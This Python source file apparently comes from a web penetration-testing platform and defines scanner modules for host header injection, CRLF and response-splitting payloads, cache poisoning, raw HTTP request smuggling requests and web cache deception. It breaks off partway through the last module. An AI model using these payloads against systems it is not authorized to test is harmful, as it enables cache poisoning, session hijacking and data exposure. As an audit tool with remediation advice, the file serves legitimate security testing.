"""
HTTP-level attack modules — auto-discovered by ModuleRegistry.
Sprint 2 Phase 1: Host Header Injection, HTTP Method Fuzzer, CRLF Injection
"""
from __future__ import annotations
from apps.modules.engine import BaseModule, FieldSchema
from apps.modules.runner import ToolRunner


# ─── [H-05] Host Header Injection ────────────────────────────────────────────

class HostHeaderInjectionModule(BaseModule):
    id = "H-05"
    name = "Host Header Injection"
    category = "http"
    description = (
        "Test for Host header injection via redirect, email link poisoning, "
        "and SSRF via Host header manipulation."
    )
    risk_level = "high"
    tags = ["host-header", "ssrf", "redirect", "middleware-bypass"]
    celery_queue = "web_audit_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/",
        ),
        FieldSchema(
            key="attacker_domain",
            label="Attacker Domain",
            field_type="text",
            required=True,
            placeholder="attacker.com",
        ),
        FieldSchema(
            key="payloads",
            label="Injection Headers",
            field_type="checkbox_group",
            default=["host", "x_forwarded_host", "x_host", "forwarded"],
            options=[
                {"value": "host",             "label": "Host"},
                {"value": "x_forwarded_host", "label": "X-Forwarded-Host"},
                {"value": "x_host",           "label": "X-Host"},
                {"value": "forwarded",        "label": "Forwarded"},
                {"value": "x_original_url",   "label": "X-Original-URL"},
                {"value": "x_rewrite_url",    "label": "X-Rewrite-URL"},
            ],
        ),
    ]

    _HEADER_MAP = {
        "host":             "Host",
        "x_forwarded_host": "X-Forwarded-Host",
        "x_host":           "X-Host",
        "forwarded":        "Forwarded",
        "x_original_url":   "X-Original-URL",
        "x_rewrite_url":    "X-Rewrite-URL",
    }

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import urllib.request
        import urllib.error

        url = params["target_url"]
        attacker = params["attacker_domain"]
        payloads = params.get("payloads", ["host", "x_forwarded_host"])
        findings = []

        for payload_key in payloads:
            hdr_name = self._HEADER_MAP.get(payload_key)
            if not hdr_name:
                continue
            try:
                req = urllib.request.Request(url, headers={
                    hdr_name: attacker,
                    "User-Agent": "PenTools/1.0",
                })
                with urllib.request.urlopen(req, timeout=10) as resp:
                    body = resp.read().decode("utf-8", errors="replace")
                    status = resp.status
                    reflected = attacker in body
                    stream("info", f"{hdr_name}: {attacker} → HTTP {status} reflected={reflected}")
                    if reflected:
                        findings.append({
                            "title": f"Host header reflected: {hdr_name}",
                            "severity": "high",
                            "url": url,
                            "description": (
                                f"Attacker domain '{attacker}' was reflected in the response body "
                                f"when injected via {hdr_name}. "
                                "Could enable cache poisoning or password-reset link hijacking."
                            ),
                            "evidence": f"HTTP {status} — '{attacker}' in body",
                            "remediation": (
                                "Whitelist allowed Host values. "
                                "Never use Host header to build absolute URLs."
                            ),
                        })
            except urllib.error.HTTPError as e:
                stream("info", f"{hdr_name} → HTTP {e.code}")
            except Exception as e:
                stream("warning", f"{hdr_name} → {e}")

        return {
            "status": "done",
            "findings": findings,
            "raw_output": f"Tested {len(payloads)} Host header variants against {url}",
        }


# ─── [H-06] HTTP Method Fuzzer ────────────────────────────────────────────────

class HTTPMethodFuzzerModule(BaseModule):
    id = "H-06"
    name = "HTTP Method Fuzzer"
    category = "http"
    description = (
        "Test which HTTP verbs are allowed on an endpoint: "
        "TRACE, OPTIONS, PUT, DELETE, PATCH, CONNECT."
    )
    risk_level = "low"
    tags = ["http-methods", "trace", "options", "verb-enum"]
    celery_queue = "web_audit_queue"
    time_limit = 60

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/api/users",
        ),
        FieldSchema(
            key="methods",
            label="Methods to Test",
            field_type="checkbox_group",
            default=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "HEAD"],
            options=[
                {"value": "GET",     "label": "GET"},
                {"value": "POST",    "label": "POST"},
                {"value": "PUT",     "label": "PUT"},
                {"value": "DELETE",  "label": "DELETE"},
                {"value": "PATCH",   "label": "PATCH"},
                {"value": "OPTIONS", "label": "OPTIONS"},
                {"value": "TRACE",   "label": "TRACE"},
                {"value": "HEAD",    "label": "HEAD"},
                {"value": "CONNECT", "label": "CONNECT"},
            ],
        ),
        FieldSchema(
            key="auth_cookie",
            label="Session Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            group="advanced",
        ),
    ]

    _DANGEROUS = {"TRACE", "PUT", "DELETE", "CONNECT"}

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import urllib.request
        import urllib.error

        url = params["target_url"]
        methods = params.get("methods", ["GET", "POST", "OPTIONS", "TRACE"])
        cookie = params.get("auth_cookie")
        findings = []

        for method in methods:
            try:
                headers = {"User-Agent": "PenTools/1.0"}
                if cookie:
                    headers["Cookie"] = cookie
                req = urllib.request.Request(url, headers=headers, method=method)
                with urllib.request.urlopen(req, timeout=10) as resp:
                    status = resp.status
                    stream("info", f"{method} {url} → {status}")
                    if method in self._DANGEROUS and status < 400:
                        findings.append({
                            "title": f"Dangerous HTTP method enabled: {method}",
                            "severity": "medium" if method == "TRACE" else "high",
                            "url": url,
                            "description": f"Method {method} returned HTTP {status}. This verb should typically be disabled.",
                            "evidence": f"{method} {url} → {status}",
                            "remediation": f"Disable {method} method on this endpoint. Configure the web server to restrict allowed verbs.",
                        })
            except urllib.error.HTTPError as e:
                stream("info", f"{method} {url} → {e.code}")
            except Exception as e:
                stream("warning", f"{method} → {e}")

        return {
            "status": "done",
            "findings": findings,
            "raw_output": f"Tested {len(methods)} HTTP methods against {url}",
        }


# ─── [H-07] CRLF Injection ───────────────────────────────────────────────────

class CRLFInjectionModule(BaseModule):
    id = "H-07"
    name = "CRLF Injection"
    category = "http"
    description = (
        "Detect CRLF injection via crlfuzz: header injection, Set-Cookie smuggling, "
        "log injection, and XSS via CRLF."
    )
    risk_level = "high"
    tags = ["crlf", "header-injection", "crlfuzz", "response-splitting"]
    celery_queue = "web_audit_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/redirect?url=",
        ),
        FieldSchema(
            key="headers",
            label="Extra Request Headers",
            field_type="header_list",
            required=False,
            help_text="Auth or custom headers to include.",
            group="advanced",
        ),
        FieldSchema(
            key="silent",
            label="Silent Mode (less output)",
            field_type="toggle",
            default=True,
            group="advanced",
        ),
        FieldSchema(
            key="threads",
            label="Threads",
            field_type="range_slider",
            default=30,
            min_value=1,
            max_value=100,
            step=5,
            group="advanced",
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        runner = ToolRunner("crlfuzz")
        url = params["target_url"]
        threads = str(int(params.get("threads", 30)))
        output_file = runner.output_file_path(job_id, "txt")

        args = ["-u", url, "-t", threads, "-o", str(output_file)]
        if params.get("silent"):
            args.append("-s")

        extra_headers = params.get("headers", [])
        if isinstance(extra_headers, list):
            for h in extra_headers:
                if isinstance(h, dict):
                    name = h.get("key", "").strip()
                    val = h.get("value", "").strip()
                    if name and val:
                        args += ["-H", f"{name}: {val}"]

        stream("info", f"Running crlfuzz against {url}...")
        result = runner.run(args=args, stream=stream, timeout=self.time_limit)

        findings = []
        import os
        if os.path.exists(output_file):
            with open(output_file) as f:
                lines = [l.strip() for l in f if l.strip()]
            for vuln_url in lines:
                findings.append({
                    "title": f"CRLF Injection: {vuln_url[:80]}",
                    "severity": "high",
                    "url": vuln_url,
                    "description": "crlfuzz confirmed CRLF injection via this URL pattern.",
                    "evidence": vuln_url,
                    "remediation": (
                        "Sanitize and encode CR/LF characters (\\r\\n) in all reflected values. "
                        "Use framework-provided redirect helpers instead of manual header construction."
                    ),
                })

        return {
            "status": "done" if result["returncode"] in (0, 1) else "failed",
            "findings": findings,
            "raw_output": result.get("stdout", ""),
        }


# ─── [H-02] HTTP Response Splitting ──────────────────────────────────────────

class HTTPResponseSplittingModule(BaseModule):
    id = "H-02"
    name = "HTTP Response Splitting"
    category = "http"
    description = (
        "Test for HTTP Response Splitting by injecting CRLF sequences into "
        "HTTP header values (Location, Set-Cookie, custom headers)."
    )
    risk_level = "high"
    tags = ["http", "response-splitting", "crlf", "header-injection"]
    celery_queue = "web_audit_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url", label="Target URL (reflect param in header)",
                    field_type="url", required=True,
                    placeholder="https://example.com/redirect?url="),
        FieldSchema(key="inject_param", label="Injection Parameter Name",
                    field_type="text", required=True,
                    placeholder="url"),
        FieldSchema(key="inject_location", label="Injection Location",
                    field_type="select",
                    options=["query", "header", "cookie"],
                    default="query"),
        FieldSchema(key="custom_header", label="Custom Header Name (if inject_location=header)",
                    field_type="text", required=False,
                    placeholder="X-Custom-Header"),
    ]

    _CRLF_PAYLOADS = [
        "%0d%0aSet-Cookie:pentools=splitmeplz",
        "%0aSet-Cookie:pentools=splitmeplz",
        "%0d%0a%20Set-Cookie:pentools=splitmeplz",
        "\r\nSet-Cookie:pentools=splitmeplz",
        "\nSet-Cookie:pentools=splitmeplz",
        "%E5%98%8D%E5%98%8ASet-Cookie:pentools=splitmeplz",  # Unicode CRLF
        "pentools%0d%0aX-Injected: pentools-header",
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3; urllib3.disable_warnings()

        target_url = params["target_url"]
        inject_param = params.get("inject_param") or "url"
        inject_location = params.get("inject_location", "query") or "query"
        custom_header = params.get("custom_header") or "X-Custom"

        session = requests.Session()
        session.verify = False
        headers = {"User-Agent": "PenTools/1.0"}
        findings = []

        stream(f"[H-02] Testing {len(self._CRLF_PAYLOADS)} CRLF payloads for response splitting...")

        for payload in self._CRLF_PAYLOADS:
            try:
                if inject_location == "query":
                    probe_url = target_url + ("&" if "?" in target_url else "?") + inject_param + "=" + payload
                    r = session.get(probe_url, headers=headers, timeout=10, allow_redirects=False)
                elif inject_location == "header":
                    h = dict(headers)
                    h[custom_header] = payload
                    r = session.get(target_url, headers=h, timeout=10, allow_redirects=False)
                else:  # cookie
                    r = session.get(target_url, headers=headers,
                                    cookies={inject_param: payload}, timeout=10, allow_redirects=False)

                # Detect if injected header appears in response
                raw_headers_text = "\n".join(k + ": " + v for k, v in r.headers.items()).lower()
                if "pentools" in raw_headers_text or "x-injected" in raw_headers_text:
                    findings.append({
                        "title": "HTTP Response Splitting Confirmed",
                        "severity": "high",
                        "url": target_url,
                        "description": (
                            "CRLF injection succeeded — the injected header appeared in the "
                            "HTTP response headers. This allows attackers to inject arbitrary "
                            "headers, forge Set-Cookie, and conduct XSS/cache poisoning."
                        ),
                        "evidence": "Payload: " + payload + " → injected header reflected in response.",
                        "remediation": (
                            "Sanitize all user input before including in HTTP response headers. "
                            "Strip or reject CR (\\r) and LF (\\n) characters from header values."
                        ),
                        "cwe_id": "CWE-113",
                    })
                    stream("[H-02] Response splitting confirmed with: " + payload)
                    break
                elif r.status_code == 500:
                    findings.append({
                        "title": "HTTP Response Splitting — Server Error on CRLF",
                        "severity": "medium",
                        "url": target_url,
                        "description": "CRLF payload caused a 500 error, suggesting unsafe header value handling.",
                        "evidence": "Payload: " + payload + " → HTTP 500",
                        "remediation": "Validate and sanitize response header values. Strip CRLF characters.",
                        "cwe_id": "CWE-113",
                    })
                    break
            except Exception as e:
                stream(f"[H-02] Payload error: {e}")

        return {"status": "done", "findings": findings}


# ─── [H-03] Cache Poisoning ───────────────────────────────────────────────────

class CachePoisoningModule(BaseModule):
    id = "H-03"
    name = "Cache Poisoning"
    category = "http"
    description = (
        "Probe for unkeyed HTTP headers that poison the cache: "
        "X-Forwarded-Host, X-Forwarded-Scheme, X-Host, X-Original-URL, "
        "X-Original-Host. Compare poisoned vs clean response."
    )
    risk_level = "high"
    tags = ["http", "cache-poisoning", "unkeyed-header", "web-cache"]
    celery_queue = "web_audit_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url", label="Target URL (cached page/endpoint)",
                    field_type="url", required=True,
                    placeholder="https://www.example.com/"),
        FieldSchema(key="cache_buster_param", label="Cache Buster Param Name",
                    field_type="text", default="pentools_cb",
                    required=False),
        FieldSchema(key="attacker_domain", label="Attacker Domain (injected in header)",
                    field_type="text", required=False,
                    default="evil.pentools.example.com"),
    ]

    _UNKEYED_HEADERS = [
        "X-Forwarded-Host",
        "X-Host",
        "X-Forwarded-Server",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-HTTP-Host-Override",
        "X-Forwarded-Port",
        "X-Forwarded-Scheme",
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests, time, random, string
        import urllib3; urllib3.disable_warnings()

        target_url = params["target_url"]
        cb_param = params.get("cache_buster_param") or "pentools_cb"
        attacker_domain = params.get("attacker_domain") or "evil.pentools.example.com"

        session = requests.Session()
        session.verify = False
        base_headers = {"User-Agent": "PenTools/1.0"}
        findings = []

        # Add unique cache buster to bypass existing cache
        def url_with_buster():
            buster = "".join(random.choices(string.ascii_lowercase, k=8))
            sep = "&" if "?" in target_url else "?"
            return target_url + sep + cb_param + "=" + buster

        stream(f"[H-03] Testing {len(self._UNKEYED_HEADERS)} unkeyed header candidates...")

        for header in self._UNKEYED_HEADERS:
            try:
                url = url_with_buster()
                # Baseline request
                r_clean = session.get(url, headers=base_headers, timeout=10)
                clean_body = r_clean.text

                # Poisoned request
                poison_headers = dict(base_headers)
                poison_headers[header] = attacker_domain
                r_poison = session.get(url, headers=poison_headers, timeout=10)
                poison_body = r_poison.text

                # Check if attacker domain appears in response (indicates header is unkeyed/reflected)
                if attacker_domain in poison_body and attacker_domain not in clean_body:
                    findings.append({
                        "title": "Cache Poisoning — Unkeyed Header: " + header,
                        "severity": "high",
                        "url": target_url,
                        "description": (
                            f"The header '{header}: {attacker_domain}' was reflected in the "
                            "response body. If this response is cached, subsequent users "
                            "will receive the poisoned content."
                        ),
                        "evidence": header + ": " + attacker_domain + " reflected in response body.",
                        "remediation": (
                            "Configure cache to key on all appropriate headers. "
                            "Reject or sanitize unexpected forwarding headers. "
                            "Use Vary header to include security-sensitive headers in cache key."
                        ),
                        "cwe_id": "CWE-444",
                    })
                    stream("[H-03] Unkeyed header found: " + header)
            except Exception as e:
                stream(f"[H-03] {header} error: {e}")

        return {"status": "done", "findings": findings}


# ─── [H-08] Redirect Chain Analysis ──────────────────────────────────────────

class RedirectChainAnalysisModule(BaseModule):
    id = "H-08"
    name = "Redirect Chain Analysis"
    category = "http"
    description = (
        "Follow and analyze multi-hop redirect chains to detect: token/session leakage "
        "via Referer, open redirects, mixed-content downgrade, and redirect loops."
    )
    risk_level = "medium"
    tags = ["http", "redirect", "open-redirect", "referer-leakage", "mixed-content"]
    celery_queue = "web_audit_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url", label="Starting URL", field_type="url",
                    required=True, placeholder="https://example.com/redirect?url=https://other.com"),
        FieldSchema(key="max_hops", label="Maximum Redirect Hops", field_type="number",
                    default=10, min_value=1, max_value=30),
        FieldSchema(key="sensitive_params", label="Sensitive Params in URL (comma-separated)",
                    field_type="text", required=False,
                    placeholder="token,session,code,state,access_token"),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests, re
        import urllib3; urllib3.disable_warnings()

        target_url = params["target_url"]
        max_hops = int(params.get("max_hops", 10))
        sensitive_raw = params.get("sensitive_params") or "token,session,code,state,access_token"
        sensitive_params = [p.strip() for p in sensitive_raw.split(",") if p.strip()]

        findings = []
        chain = []
        current_url = target_url
        seen_urls = set()

        stream(f"[H-08] Following redirect chain from {target_url} (max {max_hops} hops)...")

        for hop in range(max_hops):
            if current_url in seen_urls:
                findings.append({
                    "title": "Redirect Loop Detected",
                    "severity": "medium",
                    "url": current_url,
                    "description": f"Redirect loop detected after {hop} hops: {current_url} already visited.",
                    "evidence": "Chain: " + " → ".join(chain[-5:]),
                    "remediation": "Fix circular redirect logic in application routing.",
                    "cwe_id": "CWE-674",
                })
                break
            seen_urls.add(current_url)
            chain.append(current_url)

            try:
                session = requests.Session()
                session.verify = False
                r = session.get(current_url, headers={"User-Agent": "PenTools/1.0"},
                                timeout=10, allow_redirects=False)

                if r.status_code not in (301, 302, 303, 307, 308):
                    stream(f"[H-08] Chain ended at hop {hop + 1}: {current_url} → {r.status_code}")
                    break

                next_url = r.headers.get("Location", "")
                if not next_url:
                    break

                # Make absolute if relative
                if next_url.startswith("/"):
                    base = "/".join(current_url.split("/")[:3])
                    next_url = base + next_url

                stream(f"[H-08] Hop {hop + 1}: {current_url} → {r.status_code} → {next_url}")

                # Check for sensitive param leakage in redirect target
                for sp in sensitive_params:
                    if sp + "=" in current_url and (
                        next_url.startswith("http://") or
                        any(domain not in next_url for domain in [current_url.split("/")[2]])
                    ):
                        findings.append({
                            "title": "Sensitive Parameter Leak in Redirect",
                            "severity": "high",
                            "url": current_url,
                            "description": (
                                f"URL with sensitive parameter '{sp}' redirects to {next_url}. "
                                "The Referer header from the redirect may expose the sensitive value."
                            ),
                            "evidence": "URL: " + current_url + " → " + next_url,
                            "remediation": "Remove sensitive params from URLs before redirecting. Use POST body or secure storage.",
                            "cwe_id": "CWE-598",
                        })

                # HTTPS → HTTP downgrade
                if current_url.startswith("https://") and next_url.startswith("http://"):
                    findings.append({
                        "title": "Redirect Downgrade: HTTPS → HTTP",
                        "severity": "high",
                        "url": current_url,
                        "description": f"Redirect from HTTPS to plain HTTP: {current_url} → {next_url}",
                        "evidence": str(r.status_code) + " Location: " + next_url,
                        "remediation": "Ensure all redirects preserve HTTPS. Set HSTS with includeSubDomains.",
                        "cwe_id": "CWE-319",
                    })

                # Open redirect to external domain
                current_domain = current_url.split("/")[2] if "//" in current_url else ""
                next_domain = next_url.split("/")[2] if "//" in next_url else ""
                if current_domain and next_domain and current_domain != next_domain:
                    findings.append({
                        "title": "Open Redirect to External Domain",
                        "severity": "medium",
                        "url": current_url,
                        "description": (
                            f"Redirects from {current_domain} to external domain {next_domain}. "
                            "Verify this is intentional and attacker-controllable."
                        ),
                        "evidence": str(r.status_code) + " " + current_url + " → " + next_url,
                        "remediation": "Validate redirect destinations against an allowlist of trusted domains.",
                        "cwe_id": "CWE-601",
                    })

                current_url = next_url
            except Exception as e:
                stream(f"[H-08] Hop {hop + 1} error: {e}")
                break

        # Summary
        if len(chain) > 1:
            stream(f"[H-08] Chain length: {len(chain)} hops — " + " → ".join([u[:50] for u in chain]))

        return {"status": "done", "findings": findings}


# ─── [H-01] HTTP Request Smuggling ───────────────────────────────────────────

class HTTPRequestSmugglingModule(BaseModule):
    id = "H-01"
    name = "HTTP Request Smuggling"
    category = "http"
    description = (
        "Detect HTTP/1.1 request smuggling (CL.TE, TE.CL, TE.TE) by sending "
        "ambiguous Transfer-Encoding + Content-Length combinations and measuring "
        "response timing anomalies or differential responses."
    )
    risk_level = "high"
    tags = ["smuggling", "http", "cl.te", "te.cl", "desync", "h2"]
    celery_queue = "web_audit_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url",  label="Target URL",  field_type="url",  required=True),
        FieldSchema(
            key="smuggle_types",
            label="Smuggling Techniques",
            field_type="checkbox_group",
            default=["CL_TE", "TE_CL"],
            options=[
                {"value": "CL_TE",   "label": "CL.TE (Content-Length frontend, TE backend)"},
                {"value": "TE_CL",   "label": "TE.CL (TE frontend, Content-Length backend)"},
                {"value": "TE_TE",   "label": "TE.TE (obfuscated Transfer-Encoding)"},
            ],
        ),
        FieldSchema(key="timing_threshold", label="Timing threshold (s)",  field_type="number", default=5,
                    help_text="Requests taking longer than this may indicate a smuggled request stalling."),
        FieldSchema(key="auth_header",  label="Authorization",  field_type="text",  required=False, group="credentials"),
    ]

    def _raw_request(self, host: str, port: int, use_ssl: bool, raw: bytes, timeout: int = 12) -> tuple:
        """Send a raw HTTP request via socket and return (elapsed_seconds, response_bytes)."""
        import socket, ssl, time

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.connect((host, port))
            start = time.time()
            s.sendall(raw)
            resp = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if b"\r\n\r\n" in resp and len(resp) > 200:
                        break
            except socket.timeout:
                pass
            elapsed = time.time() - start
            return elapsed, resp
        finally:
            s.close()

    def _build_cl_te(self, host: str) -> bytes:
        """CL.TE: Content-Length says 4 bytes; TE chunk header smuggles extra request."""
        body = "0\r\n\r\nG"  # chunk 0 terminator, then 'G' to smuggle GPOST
        cl = str(len(body))
        return (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body}"
        ).encode()

    def _build_te_cl(self, host: str) -> bytes:
        """TE.CL: TE frontend terminates at chunk 0; CL backend reads further data as next request."""
        return (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"G\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

    def _build_te_te(self, host: str) -> bytes:
        """TE.TE: Two TE headers — one obfuscated to cause differential parsing."""
        return (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Transfer-Encoding: identity\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        ).encode()

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import time
        from urllib.parse import urlparse

        url = params["target_url"].strip()
        techniques = params.get("smuggle_types", ["CL_TE", "TE_CL"])
        timing_threshold = float(params.get("timing_threshold", 5))
        auth = params.get("auth_header", "").strip()

        parsed = urlparse(url)
        host = parsed.hostname or url
        use_ssl = parsed.scheme == "https"
        port = parsed.port or (443 if use_ssl else 80)

        findings = []
        raw_lines = [f"Target: {url}", f"Host: {host}:{port}", f"Techniques: {techniques}"]

        builders = {
            "CL_TE": self._build_cl_te,
            "TE_CL": self._build_te_cl,
            "TE_TE": self._build_te_te,
        }

        for tech in techniques:
            builder = builders.get(tech)
            if not builder:
                continue
            raw_payload = builder(host)
            stream("info", f"Testing {tech} smuggling on {host}:{port}...")
            raw_lines.append(f"\n[{tech}] Payload ({len(raw_payload)} bytes)")

            try:
                elapsed, resp_bytes = self._raw_request(host, port, use_ssl, raw_payload,
                                                         timeout=int(timing_threshold) + 5)
                resp_text = resp_bytes.decode("utf-8", errors="replace")[:500]
                raw_lines.append(f"[{tech}] Elapsed: {elapsed:.2f}s | Response: {resp_text[:100]}")
                stream("info", f"[{tech}] Response in {elapsed:.2f}s")

                if elapsed > timing_threshold:
                    stream("warning", f"[{tech}] Timing anomaly detected ({elapsed:.1f}s > {timing_threshold}s threshold)")
                    findings.append({
                        "title": f"HTTP Request Smuggling timing anomaly — {tech}",
                        "severity": "high",
                        "url": url,
                        "description": (
                            f"{tech} payload caused a {elapsed:.1f}s delay (threshold: {timing_threshold}s). "
                            "This may indicate the backend is waiting for a smuggled request body, "
                            "suggesting HTTP request smuggling is possible."
                        ),
                        "evidence": f"Elapsed: {elapsed:.2f}s\nRequest snippet:\n{raw_payload.decode('utf-8', errors='replace')[:300]}\nResponse:\n{resp_text}",
                        "remediation": (
                            "Disable HTTP/1.1 keep-alive on the front-end proxy. "
                            "Configure the proxy to normalize TE and CL headers before forwarding. "
                            "Use HTTP/2 end-to-end where possible."
                        ),
                        "cvss_score": 8.1, "cwe_id": "CWE-444",
                    })
                elif "400" in resp_text[:20] or "invalid" in resp_text.lower():
                    raw_lines.append(f"[{tech}] Server rejected (400) — may be protected")
                    stream("info", f"[{tech}] Server returned 400 — TE handling may be strict")
                else:
                    stream("info", f"[{tech}] No timing anomaly — response normal")

            except Exception as e:
                raw_lines.append(f"[{tech}] Error: {e}")
                stream("warning", f"[{tech}] Connection error: {e}")

        if not findings:
            findings.append({
                "title": "HTTP Request Smuggling — no timing anomaly detected",
                "severity": "info",
                "url": url,
                "description": "CL.TE/TE.CL/TE.TE probes sent. No significant timing differences detected.",
                "evidence": "\n".join(raw_lines[-15:]),
                "remediation": "Keep HTTP/2 end-to-end. Configure proxies to rewrite conflicting TE/CL headers.",
            })

        stream("success", f"Request smuggling test complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}


# ─── [H-04] Web Cache Deception ──────────────────────────────────────────────

class WebCacheDeceptionModule(BaseModule):
    id = "H-04"
    name = "Web Cache Deception"
    category = "http"
    description = (
        "Test for web cache deception by appending static-looking path suffixes "
        "to authenticated endpoints. If the page is cached and later retrievable "
        "without authentication, sensitive data exposure is confirmed."
    )
    risk_level = "high"
    tags = ["cache", "deception", "authenticated", "cdn", "path-confusion"]
    celery_queue = "web_audit_queue"
    time_limit = 90

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url",  label="Victim (authenticated) URL",   field_type="url",  required=True,
                    placeholder="https://example.com/account/profile"),
        FieldSchema(key="auth_header", label="Auth Header (victim session)",  field_type="text", required=True,
                    placeholder="Bearer eyJ..."),
        FieldSchema(
            key="path_suffixes",
            label="Cache-deceptive path suffixes",
            field_type="textarea",
            default=(
                "/static/x.css\n"
                "/static/x.js\n"
                "/..%2Fstatic%2Fx.css\n"
                "/assets/x.png\n"
                "/.well-known/security.txt\n"
                "/favicon.ico\n"
            ),
            help_text="One path suffix per line. Appended to the victim URL.",
        ),
        FieldSchema(
            key="cache_indicators",
            label="Cache hit indicators (response headers)",
            field_type="checkbox_group",
            default=["Age", "X-Cache", "CF-Cache-Status"],
            options=[
                {"value": "Age",                "label": "Age (> 0 = cached)"},
                {"value": "X-Cache",            "label": "X-Cache: HIT"},
                {"value": "CF-Cache-Status",    "label": "CF-Cache-Status: HIT"},
                {"value": "X-Proxy-Cache",      "label": "X-Proxy-Cache: HIT"},
                {"value": "Surrogate-Key",      "label": "Surrogate-Key present"},
            ],
        ),
        FieldSchema(
            key="sensitive_patterns",
            label="Sensitive data patterns to look for",
            field_type="textarea",
            default="email\nusername\napi_key\ntoken\nsession\ncredit_card\ncsrf",
            help_text="Regex/keyword patterns (one per line) to detect in cached response without auth.",
        ),
    ]

    def _get(self, url: str, headers: dict) -> tuple:
        import urllib.request, urllib.error
        req = urllib.request.Request(url, headers={"User-Agent": "PenTools/1.0", **headers})
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                return r.status, dict(r.headers), r.read(16384).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), e.read(4096).decode("utf-8", errors="replace")
        except Exception as ex:
            return 0, {}, str(ex)

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import re, time

        url = params["target_url"].strip().rstrip("/")
        auth = params.get("auth_header", "").strip()
        raw_suffixes = params.get("path_suffixes", "")
        suffixes = [s.strip() for s in raw_suffixes.strip().splitlines() if s.strip()]
        cache_hdrs = params.get("cache_indicators", ["Age", "X-Cache"])
        raw_patterns = params.get("sensitive_patterns", "")
        patterns = [p.strip() for p in raw_patterns.strip().splitlines() if p.strip()]

        findings = []
        raw_lines = [f"Target: {url}", f"Suffixes: {len(suffixes)}"]

        # Step 1: Fetch authenticated baseline
        stream("info", "Fetching authenticated baseline...")
        auth_code, auth_hdrs, auth_body = self._get(url, {"Authorization": auth})
        raw_lines.append(f"Authenticated baseline: HTTP {auth_code}, {len(auth_body)} bytes")

        for suffix in suffixes:
            deception_url = url + suffix
            stream("info", f"Testing: {deception_url[:90]}...")

            # Step 2: Fetch with auth (to trigger caching)
            c1, h1, b1 = self._get(deception_url, {"Authorization": auth})
            time.sleep(0.3)

            # Step 3: Fetch WITHOUT auth (to see if cached response is returned)
            c2, h2, b2 = self._get(deception_url, {})
            raw_lines.append(f"  [{suffix}] auth: {c1}, no-auth: {c2}")

            # Detect cache hit
            hit_header = None
            for ch in cache_hdrs:
                h2_lower = {k.lower(): v for k, v in h2.items()}
                if ch.lower() in h2_lower:
                    val = h2_lower[ch.lower()]
                    if ch == "Age" and val.strip().isdigit() and int(val) > 0:
                        hit_header = f"Age: {val}"
                    elif "HIT" in val.upper():
                        hit_header = f"{ch}: {val}"

            # Check if unauthenticated response contains sensitive patterns
            sensitive_found = []
            if b2 and c2 in (200, 304):
                for pat in patterns:
                    if re.search(pat, b2, re.IGNORECASE):
                        sensitive_found.append(pat)

            if hit_header and c2 == 200 and sensitive_found:
                stream("success", f"Web Cache Deception confirmed: {deception_url}")
                findings.append({
                    "title": f"Web Cache Deception — sensitive data cached ({suffix})",
                    "severity": "high",
                    "url": deception_url,
                    "description": (
                        f"Authenticated request to '{deception_url}' was cached ({hit_header}). "
                        f"Unauthenticated re-fetch returned HTTP {c2} with sensitive patterns: {sensitive_found}."
                    ),
                    "evidence": (
                        f"Cache header: {hit_header}\n"
                        f"Sensitive patterns found: {sensitive_found}\n"
                        f"Response snippet (no-auth): {b2[:800]}"
                    ),
                    "remediation": (
                        "Set Cache-Control: no-store on authenticated responses. "
                        "Configure CDN/cache to not store responses for authenticated endpoints. "
                        "Strip path extensions before routing to application logic."
                    ),
                    "cvss_score": 7.5, "cwe_id": "CWE-524",
                })
            elif hit_header and c2 == 200:
                stream("warning", f"Potential cache deception ({suffix}) — response cached but no sensitive pattern match")
                findings.append({
                    "title": f"Possible cache deception — response served from cache ({suffix})",
                    "severity": "medium",
                    "url": deception_url,
